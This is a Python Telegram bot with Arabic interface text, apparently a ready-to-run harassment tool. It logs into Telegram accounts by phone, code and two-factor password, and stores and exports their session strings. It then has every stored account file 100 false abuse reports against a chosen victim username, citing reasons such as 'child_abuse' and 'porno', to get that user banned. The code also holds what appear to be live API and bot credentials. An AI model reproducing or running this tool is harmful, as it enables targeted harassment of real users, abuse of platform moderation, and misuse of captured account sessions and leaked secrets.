import sqlite3, asyncio, random, os
from pyromod import listen
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import FloodWait, RPCError, SessionPasswordNeeded

# --- بيانات التحكم (تأكد منها) ---
API_ID = 2040 
API_HASH = "b18441a1ff607e10a989891a5462e627"
BOT_TOKEN = "8043094829:AAGnBZOHKpjQnLAVUrbGXFjlymg0uN6Z1jg"
ADMIN_ID = 7983604121

app = Client("Black_Ultimate_V30", API_ID, API_HASH, bot_token=BOT_TOKEN, device_model="Server 24/7")

# --- إدارة قاعدة البيانات ---
def db_init():
    conn = sqlite3.connect("black_ultimate.db")
    conn.execute("CREATE TABLE IF NOT EXISTS accounts (id INTEGER PRIMARY KEY, session TEXT)")
    conn.commit()
    conn.close()

def db_manage(query, params=(), fetch=False):
    conn = sqlite3.connect("black_ultimate.db")
    cursor = conn.execute(query, params)
    res = cursor.fetchall() if fetch else None
    conn.commit()
    conn.close()
    return res

# --- محرك الهجوم (100 بلاغ متنوع) ---
async def turbo_report(session, target):
    try:
        async with Client("acc", API_ID, API_HASH, session_string=session, in_memory=True) as acc:
            reasons = ["spam", "violence", "porno", "child_abuse", "copyright", "fake", "geo_irrelevant"]
            report_count = 0
            while report_count < 100:
                random.shuffle(reasons)
                for r in reasons:
                    if report_count >= 100: break
                    try:
                        await acc.report_peer(target, reason=r, message="Urgent: Terms of Service Violation")
                        report_count += 1
                        await asyncio.sleep(0.2) # تأخير بسيط للحماية
                    except FloodWait as e:
                        await asyncio.sleep(e.value)
                    except: continue
            return True
    except: return False

@app.on_message(filters.command("start") & filters.user(ADMIN_ID))
async def start(c, m):
    res = db_manage("SELECT COUNT(*) FROM accounts", fetch=True)
    count = res[0][0] if res else 0
    txt = (f"🔥 **أهلاً بك يا روح في النظام النهائي V30**\n\n"
           f"🖥️ الحالة: متصل بالسيرفر 24/7\n"
           f"📊 جيشك الحالي: `{count}` حساب\n"
           f"🚀 القوة: `{count * 100}` بلاغ في الهجمة الواحدة")
    
    btns = InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ تجنيد حساب جديد", callback_data="add")],
        [InlineKeyboardButton("☢️ إطلاق الهجوم النووي", callback_data="nuke")],
        [InlineKeyboardButton("📁 تصدير الحسابات", callback_data="export"), InlineKeyboardButton("🧹 تصفير", callback_data="clear")]
    ])
    await m.reply_text(txt, reply_markup=btns)

@app.on_callback_query(filters.user(ADMIN_ID))
async def cb_handler(c, cb):
    if cb.data == "add":
        await cb.message.delete()
        try:
            ask = await c.ask(cb.message.chat.id, "📞 أرسل الرقم مع المفتاح الدولي:", timeout=120)
            phone = ask.text.replace(" ", "")
            temp = Client("temp", API_ID, API_HASH, in_memory=True)
            await temp.connect()
            sc = await temp.send_code(phone)
            
            code_ask = await c.ask(cb.message.chat.id, "📩 أرسل الكود:")
            try:
                await temp.sign_in(phone, sc.phone_code_hash, code_ask.text.replace(" ", ""))
            except SessionPasswordNeeded:
                pwd = await c.ask(cb.message.chat.id, "🔐 أرسل كلمة سر التحقق بخطوتين:")
                await temp.check_password(pwd.text)
            
            sess = await temp.export_session_string()
            db_manage("INSERT INTO accounts (session) VALUES (?)", (sess,))
            
            # أهم ميزة: يرسل لك النسخة على الخاص عشان ما تضيع
            await c.send_message(cb.message.chat.id, f"✅ تم التجنيد بنجاح!\n\n📋 كود الحساب (Session):\n`{sess}`")
            
        except Exception as e:
            await c.send_message(cb.message.chat.id, f"❌ فشل: {e}")

    elif cb.data == "nuke":
        rows = db_manage("SELECT session FROM accounts", fetch=True)
        if not rows: return await cb.answer("⚠️ الجيش فارغ!", show_alert=True)
        
        target_ask = await c.ask(cb.message.chat.id, "🎯 أرسل يوزر الضحية فقط (بدون @):")
        target = target_ask.text.strip()
        
        m = await c.send_message(cb.message.chat.id, f"⚔️ بدأت الغارة الشاملة (100 بلاغ لكل حساب) على: `{target}`")
        
        # الهجوم يشتغل بالخلفية عشان البوت ما يعلق
        tasks = [turbo_report(r[0], target) for r in rows]
        results = await asyncio.gather(*tasks)
        
        await m.edit_text(f"🏁 **انتهت العملية!**\n✅ نجح: {results.count(True)}\n❌ فشل: {results.count(False)}")

    elif cb.data == "export":
        rows = db_manage("SELECT session FROM accounts", fetch=True)
        if not rows: return await cb.answer("القاعدة فارغة!")
        with open("backup.txt", "w") as f:
            for r in rows: f.write(f"{r[0]}\n")
        await c.send_document(cb.message.chat.id, "backup.txt", caption="📄 نسخة احتياطية لجيشك")

    elif cb.data == "clear":
        db_manage("DELETE FROM accounts")
        await cb.answer("🧹 تم تصفير القاعدة")

if __name__ == "__main__":
    db_init()
    print("البوت يعمل الآن... V30")
    app.run()
